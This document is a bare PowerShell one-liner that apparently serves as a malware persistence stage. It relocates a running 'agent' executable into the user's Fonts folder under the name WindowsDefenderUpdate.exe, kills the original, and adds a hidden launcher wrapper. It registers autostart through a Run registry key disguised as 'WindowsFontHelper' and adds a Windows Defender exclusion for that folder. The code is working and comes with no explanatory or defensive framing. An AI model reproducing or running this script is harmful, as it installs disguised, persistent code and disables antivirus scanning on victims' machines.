$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='Stop'; $proc=Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1; if(-not $proc){exit 1}; $src=$proc.Path; $fontsFolder="$env:LOCALAPPDATA\Microsoft\Windows\Fonts"; if($src -like "$fontsFolder\*"){exit 0}; $delay = Get-Random -Minimum 8 -Maximum 16; Start-Sleep -Seconds $delay; if(-not (Test-Path $fontsFolder)){New-Item $fontsFolder -Force|Out-Null}; $dest="$fontsFolder\WindowsDefenderUpdate.exe"; if(-not (Test-Path $dest)){$c=$false; for($i=0;$i-lt5;$i++){try{[System.IO.File]::Copy($src,$dest,$true);$c=$true;break}catch{Start-Sleep -Milliseconds 500}} if(-not $c){exit 1}}; Stop-Process -Id $proc.Id -Force; Start-Sleep -Seconds 1; $wrapper="$fontsFolder\run_WindowsDefenderUpdate.cmd"; $wrapperContent='@echo off' + "`r`n" + 'timeout /t 30 /nobreak > nul' + "`r`n" + 'start "" "%~dp0WindowsDefenderUpdate.exe"'; Set-Content -Path $wrapper -Value $wrapperContent -Encoding ASCII -Force; $regPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; $regName="WindowsFontHelper"; Set-ItemProperty -Path $regPath -Name $regName -Value "`"$wrapper`"" -Force; Add-MpPreference -ExclusionPath $fontsFolder -ErrorAction SilentlyContinue | Out-Null; Start-Process -WindowStyle Hidden -FilePath $wrapper -WorkingDirectory $fontsFolder; Start-Sleep -Seconds 35; exit 0
